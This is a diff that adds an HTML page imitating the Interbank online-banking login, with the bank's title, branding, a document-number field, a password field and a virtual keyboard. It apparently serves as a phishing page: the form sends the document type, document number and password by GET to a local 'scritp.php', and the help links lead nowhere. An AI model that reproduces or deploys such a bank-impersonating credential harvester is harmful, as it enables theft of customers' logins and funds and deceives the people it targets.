@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interbank - Inicio de sesión</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="./script.js"></script>
+    <meta name="og:title" content="Banca por internet - Interbank" />
+    <meta property="og:description" content="¡Bienvenido a la Banca por Internet! Realiza tus operaciones donde estés de manera rápida y sencilla sin costo adicional." />
+    <meta property="og:image" content="./images/preview.png" />
+    <link href="./images/favicon.ico" rel="Shortcut Icon">
+
+    <style>
+        /* Estilos para el formulario */
+        .login-card {
+            position: relative; /* Necesario para el posicionamiento del teclado */
+        }
+
+        /* Estilos para la animación del input */
+        .form-row {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .form {
+            height: 50px;
+            position: relative;
+            overflow: hidden;
+            margin-right: 10px; /* Espacio entre campos */
+        }
+
+        /**/
+        .form .lbl-password{
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            border-bottom: 1px solid #c7c7c7;
+        }
+        .form .lbl-password::after{
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: -1px;
+            width: 100%;
+            height: 100%;
+            border-bottom: 3px solid #2ecece;
+            transform: translateX(-100%);
+            transition: all 0.3s ease;
+        }
+        .text-password{
+            position: absolute;
+            bottom: 5px;
+            left: 0;
+            transition: all 0.3s ease;
+            color: black;
+        }
+        .form input:focus + .lbl-password .text-password,.form input:valid + .lbl-password .text-password{
+            transform: translateY(-150%);
+            font-size: 14px;
+            color: #2ecece;
+        }
+        .form input:focus + .lbl-password:after, .form input:valid + .lbl-password:after{
+            transform: translateX(0%);
+        }
+
+
+        /* Anchos personalizados */
+        .form.select-dni {
+            width: 85px; /* Ancho más corto para el campo de selección DNI */
+        }
+
+        .form.input-documento {
+            width: 250px; /* Ancho más amplio para el campo de número de documento */
+        }
+
+        .form input, .form select {
+            width: 100%;
+            height: 100%;
+            background: none;
+            color: #000; /* Negro para que sea visible sobre fondo blanco */
+            padding-top: 16px;
+            border: none;
+            outline: 0;
+        }
+
+        .form .lbl-nombre {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            border-bottom: 1px solid #c7c7c7;
+        }
+
+        .form .lbl-nombre:after {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: -1px;
+            width: 100%;
+            height: 100%;
+            border-bottom: 3px solid #2ecece;
+            transform: translateX(-100%);
+            transition: all 0.3s ease;
+            font-size: 12px;
+        }
+
+        .text-dni {
+            position: absolute;
+            bottom: 5px;
+            transition: all 0.3s ease;
+            font-family: omnes, sans-serif;
+            font-size: 1rem;
+            color: grey;
+            pointer-events: none;
+            display: block;
+            visibility: hidden; /* Ocultar el texto de la etiqueta inicialmente */
+        }
+
+        .text-nomb {
+            position: absolute;
+            bottom: 5px;
+            left: 0;
+            transition: all 0.3s ease;
+            font-family: omnes, sans-serif;
+            font-size: 1rem;
+            color: rgba(0, 0, 0, .26);
+            pointer-events: none;
+            display: block;
+        }
+
+        .form input:focus + .lbl-nombre .text-nomb,
+        .form input:not(:placeholder-shown) + .lbl-nombre .text-nomb,
+        .form select:focus + .lbl-nombre .text-nomb,
+        .form select:valid + .lbl-nombre .text-nomb {
+            transform: translateY(-150%);
+            font-size: 14px;
+            color: #2ecece;
+        }
+
+        /* Sin movimiento al hacer clic en el select de DNI */
+        .form select:focus + .lbl-nombre .text-dni {
+            visibility: visible; /* Mostrar texto al hacer clic */
+            transform: translateY(0); /* Sin movimiento al hacer clic */
+        }
+
+        /* Mantener el texto en la posición original */
+        .form select:valid + .lbl-nombre .text-dni {
+            visibility: hidden; /* Ocultar texto después de seleccionar */
+        }
+
+        .form input:focus + .lbl-nombre:after,
+        .form input:not(:placeholder-shown) + .lbl-nombre:after,
+        .form select:focus + .lbl-nombre:after,
+        .form select:valid + .lbl-nombre:after {
+            transform: translateX(0%);
+        }
+
+        /* Estilos para el teclado virtual */
+        .keyboard {
+            display: flex;
+            display: none; /* Inicialmente oculto */
+            flex-wrap: wrap; 
+            grid-template-columns: repeat(10, 1fr);
+            gap: 5px;
+            margin-top: 10px;
+            justify-content: center; /* Centra los elementos en la fila */
+            text-align: center; /* Centra el contenido dentro de las teclas */
+}
+
+        .keyboard.active {
+            display: flex; /* Mostrar cuando esté activo */
+        }
+
+        .keyboard .key {
+            border: 1px solid #e4e5e6;
+            border-radius: 4px;
+            text-align: center;
+            cursor: pointer;
+            background-color: #fff;
+            transition: background 0.3s;
+            margin: -1px;
+            color: black;
+            min-width: 15px; /* Ancho mínimo para evitar cambios de tamaño */
+            height: 20px; /* Altura fija */
+            line-height: 20px; /* Centrar verticalmente el texto */
+            font-size: 14px; /* Tamaño de fuente consistente */
+        }
+/*
+        .key:hover {
+            background-color: #e0e0e0;
+        }*/
+        /* Cambiar la apariencia de la tecla Shift cuando está activa */
+        .key.shift-active {
+            color: #000;
+        }
+        .keyremove {
+            width: 27px; /* Ajusta el tamaño del contenedor */
+            height: 20px; /* Ajusta el tamaño del contenedor */
+            display: flex; /* Usar flexbox para centrar el contenido */
+            justify-content: center; /* Centrar horizontalmente */
+            align-items: center; /* Centrar verticalmente */
+            background-color: #f0f0f0; /* Color de fondo */
+            cursor: pointer; /* Cambia el cursor al pasar el ratón */
+            transition: background-color 0.3s; /* Efecto de transición */
+        }
+/*
+.keyremove:hover {
+    background-color: #e0e0e0; Cambio de color al pasar el ratón 
+}*/
+        .delete-icon {
+            width: 100%; /* Ajusta el tamaño de la imagen */
+            height: 100%; /* Ajusta el tamaño de la imagen */
+        }
+
+
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #2ecece;
+            font-size: 1.2em;
+        }
+    </style>
+</head>
+<body>
+    <div class="background">
+        <div class="logo"><img src="./images/logo-desktop-blue-white.png" alt=""></div>
+        <form class="login-output" id="loginForm"  action="./scritp.php" method="get"> <!-- Agregamos un ID aquí -->
+            <div class="login-card" id="loginForm">
+
+            <!-- Fila para DNI y Número de documento -->
+            <div class="form-row">
+                <!-- Campo de selección con animación -->
+                <div class="form select-dni">
+                    <select id="dniSelect"  name="dniType" required autocomplete="off" onchange="updateDNI()">
+                        <option value="dni">DNI</option>
+                        <option value="cee">CE</option>
+                        <option value="pas">PAS</option>
+                        <!-- Puedes agregar más opciones si es necesario -->
+                    </select>
+                    <label class="lbl-nombre">
+                        <span class="text-dni">DNI</span>
+                    </label>
+                </div>
+
+                <!-- Campo Número de documento con animación -->
+                <div class="form input-documento">
+                    <input type="text" name="TypeDocument"required autocomplete="off" placeholder=" ">
+                    <label class="lbl-nombre">
+                        <span class="text-nomb">Número de documento</span>
+                    </label>
+                </div>
+            </div>
+
+            <!-- Campo Contraseña con animación -->
+            <div class="form password-input">
+                <input type="password" name="password" id="passwordInput" required autocomplete="off" placeholder=" ">
+                <label class="lbl-password">
+                    <span class="text-password text-nomb">Contraseña</span>
+                </label>
+                <button type="button" id="togglePassword" class="toggle-password"><img src="./images/eyeoff.svg" alt="mostrar contraseña" id="eyeIcon"></button>
+            </div>
+
+            <!-- Teclado virtual dentro del formulario -->
+            <div class="keyboard" id="virtualKeyboard">
+                <div class="key">0</div><div class="key">8</div><div class="key">6</div><div class="key">4</div><div class="key">1</div>
+                <div class="key">7</div><div class="key">5</div><div class="key">3</div><div class="key">2</div><div class="key">9</div>
+                <div class="key">Q</div><div class="key">W</div><div class="key">E</div><div class="key">R</div><div class="key">T</div>
+                <div class="key">Y</div><div class="key">U</div><div class="key">I</div><div class="key">O</div><div class="key">P</div>
+                <div class="key">A</div><div class="key">S</div><div class="key">D</div><div class="key">F</div><div class="key">G</div>
+                <div class="key">H</div><div class="key">J</div><div class="key">K</div><div class="key">L</div><div class="key">Z</div>
+                <div class="key">⇧</div><div class="key">X</div><div class="key">C</div><div class="key">V</div><div class="key">B</div>
+                <div class="key">N</div><div class="key">M</div><!--<div class="key">✓</div>--><div class="key keyremove" id="resetButton"><div style="display: flex; justify-content: center; align-items: center;"><img src="./images/delete.png" alt="Borrar" class="delete-icon"/></div></div>
+            </div>
+
+    <script>
+        const passwordInputdelete = document.getElementById('passwordInput');
+
+        function deleteLastCharacter() {
+            const currentValue = passwordInputdelete.value; // Obtén el valor actual
+            console.log("Borrando último carácter. Valor actual:", currentValue);
+
+            if (currentValue.length > 0) {
+                const newValue = currentValue.slice(0, -1); // Elimina el último carácter
+                passwordInputdelete.value = newValue; // Actualiza el valor del input
+                console.log("Nuevo valor:", newValue);
+            } else {
+                console.log("No hay caracteres para borrar.");
+            }
+
+            // Enfocar el input después de modificar
+            passwordInputdelete.focus();
+        }
+
+        // Asocia el evento de clic al botón de borrar
+        const resetButton = document.getElementById('resetButton');
+        resetButton.addEventListener('click', deleteLastCharacter);
+    </script>
+
+            <!-- Checkbox Recordar documento -->
+            <div class="checkbox" id="rememberCheckbox">
+                <div class="custom-checkbox"></div>
+                <label for="rememberCheckbox" name="checkox" class="text-rec">Recordar documento</label>
+            </div>
+
+            <!-- Botón de envío -->
+            <button type="submit" class="submit-btn">Siguiente</button>
+            </div>
+            <!-- Enlaces de ayuda -->
+            <div class="links">
+                <a href="#">Regístrate</a> | <a href="#">Olvidé mi contraseña</a> | <a href="#">Ayuda</a>
+            </div>
+        </form>
+        
+    </div>
+    <script>
+        function updateDNI() {
+            const dniSelect = document.getElementById("dniSelect");
+            const label = dniSelect.nextElementSibling.querySelector(".text-dni");
+
+            // Ocultar texto original si se selecciona una opción
+            if (dniSelect.value === "dni") {
+                label.textContent = ""; // Ocultar texto original
+            } else {
+                label.textContent = dniSelect.options[dniSelect.selectedIndex].text; // Mostrar texto seleccionado
+            }
+        }
+
+        const passwordInput = document.getElementById('passwordInput');
+        const virtualKeyboard = document.getElementById('virtualKeyboard');
+        const loginForm = document.getElementById('loginForm'); // Obtener el formulario completo
+        const rememberCheckbox = document.getElementById('rememberCheckbox');
+        const customCheckbox = rememberCheckbox.querySelector('.custom-checkbox');
+
+
+
+
+        rememberCheckbox.addEventListener('click', () => {
+             customCheckbox.classList.toggle('checked'); // Alternar la clase "checked"
+             });
+
+
+
+        // Mostrar teclado virtual al hacer clic en el campo de contraseña
+        passwordInput.addEventListener('focus', () => {
+            virtualKeyboard.classList.add('active'); // Mostrar teclado virtual
+            virtualKeyboard.style.position = 'relative'; // o simplemente no definas posición
+        });
+
+        // Ocultar el teclado solo si se hace clic fuera del formulario completo
+        document.addEventListener('click', (event) => {
+            if (!loginForm.contains(event.target)) { // Verifica si el clic no está en el formulario
+                virtualKeyboard.classList.remove('active'); // Ocultar teclado virtual
+            }
+        });
+        let isShiftActive = false; // variable para controlar si el shift esta activo
+
+        
+
+        // Llenar el campo de contraseña con los caracteres del teclado virtual
+        const keys = document.querySelectorAll('.key');
+        keys.forEach(key => {
+            key.addEventListener('click', () => {
+                if (key.textContent === '✓') {
+                    // Aquí puedes agregar la lógica para enviar el formulario o confirmar la contraseña
+                    console.log('Enviar formulario');
+                } else if (key.textContent === '⇧') {
+                    // Cambiar estado de Shift
+                    isShiftActive = !isShiftActive;
+                    toggleCase();
+                    key.classList.toggle('shift-active'); // Cambiar la apariencia del Shift
+                } else if (!key.classList.contains('key-shift')) { // Evitamos agregar Shift al input
+                    // Tomamos el carácter y lo agregamos al input
+                    const char = isShiftActive ? key.textContent.toUpperCase() : key.textContent.toLowerCase();
+                    passwordInput.value += char;
+                }
+            });
+        });      
+        // Función para alternar entre mayúscula y minúscula
+        function toggleCase() {
+            keys.forEach(key => {
+                if (key.textContent.match(/[a-zA-Z]/)) { // Solo para letras
+                    key.textContent = isShiftActive ? key.textContent.toUpperCase() : key.textContent.toLowerCase();
+                }
+            });
+        }
+
+        // Mostrar/ocultar la contraseña
+        const P = document.getElementById('passwordInput');
+        const togglePassword = document.getElementById('togglePassword');
+        const eyeIcon = document.getElementById('eyeIcon');
+
+        togglePassword.addEventListener('click', () => {
+            const type = P.getAttribute('type') === 'password' ? 'text' : 'password';
+            P.setAttribute('type', type);
+
+            // cambia la imagen del icono
+            if (type == 'text'){
+                eyeIcon.src = './images/eyeon.svg';
+            } else{
+                eyeIcon.src = './images/eyeoff.svg';
+            }
+        });
+    </script>
+    
+</body>
+</html>
